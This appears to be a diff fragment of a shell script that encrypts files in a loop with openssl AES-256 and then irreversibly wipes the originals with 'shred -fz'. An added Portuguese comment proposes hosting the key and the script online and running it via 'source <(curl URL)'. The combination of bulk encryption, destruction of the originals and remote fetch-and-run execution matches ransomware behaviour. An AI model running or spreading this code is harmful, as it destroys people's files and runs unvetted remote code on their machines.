@@ -8,3 +8,5 @@ openssl enc -aes256 -k $(<simetric.key) -a -e -in $file -out $file".enc"
 shred -fz $file
 fi
 done
+# Se criar uma chave e mantiver ela online e esse script também, então dá pra remover o if e executar esse script com o comando "source <(curl URL),
+# fazendo a substituição devida da chave de criptografia no comando openssl para a chave online (pode estar também em arquivo).
